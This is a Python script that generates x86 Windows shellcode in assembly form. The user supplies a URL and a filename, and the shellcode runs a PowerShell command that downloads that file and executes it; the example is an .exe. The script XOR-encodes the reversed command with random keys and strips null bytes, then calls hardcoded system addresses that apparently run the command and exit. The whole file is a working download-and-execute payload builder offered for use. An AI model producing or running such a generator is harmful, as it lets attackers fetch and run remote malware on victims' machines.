import random,binascii
chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789=[]-'
p1 = '''xor eax,eax
push eax 
'''
p2 = '''
mov eax,esp
mov ebx,0x01414141
shr ebx,0x08
shr ebx,0x08
shr ebx,0x08
push ebx
push eax
mov ebx,0x77b1e695
call ebx
mov ebx,0x77ae2acf
call ebx
'''
sen1 = str(input('Enter url\nExample: http://z3r0d4y.com/file.exe \nEnter:'))
sen1 = sen1.rsplit()
sen1 = sen1[0]
sen2 = str(input('Enter filename\nExample: D:\\file.exe\nEnter:'))
sen2 = sen2.rsplit()
sen2 = sen2[0]
sen = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s')};%s"''' %(sen1,sen2,sen2)
m = 0
for word in sen:
        m += 1
m = m - 1
stack = ''
while(m>=0):
        stack += sen[m]
        m -= 1
stack = stack.encode('utf-8').hex()
skip = 1
if len(stack) % 8 == 0:
        skip = 0
if skip == 1:
        stack = '00' + stack
        if len(stack) % 8 == 0:
                skip = 0
        if skip == 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
        if skip == 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
if len(stack) % 8 == 0:
        zxzxzxz = 0
m = len(stack) / 8
c = 0
n = 0
z = 8
shf = open('shellcode.asm','w')
shf.write(p1)
shf.close()
shf = open('shellcode.asm','a')
while(c<m):
        v = 'push 0x' + stack[n:z]
        skip = 0
        if '0x000000' in v:
                skip = 1
                q1 = v[13:]
                v = 'push 0x' + q1 + '414141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x0000' in v:
                skip = 1
                q1 = v[11:]
                v = 'push 0x' + q1 + '4141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x00' in v:
                skip = 1
                q1 = v[9:]
                v = 'push 0x' + q1 + '41' + '\n' + 'pop eax\nshr eax,0x08\npush eax\n'
        if skip == 1:
                shf.write(v)
        if skip == 0:
                v = v.rsplit()
                zzz = ''
                for w in v:
                        if '0x' in w:
                                zzz = str(w)
                s1 = binascii.b2a_hex(bytearray(random.choice(chars) for i in range(4)))
                data = "%x" % (int(zzz, 16) ^ int(s1, 16))
                v =  'mov eax,0x%s\nmov ebx,0x%s\nxor eax,ebx\npush eax\n'%(data,s1.decode())
                shf.write(v)
        n += 8
        z += 8
        c += 1
shf.write(p2)
shf.close()
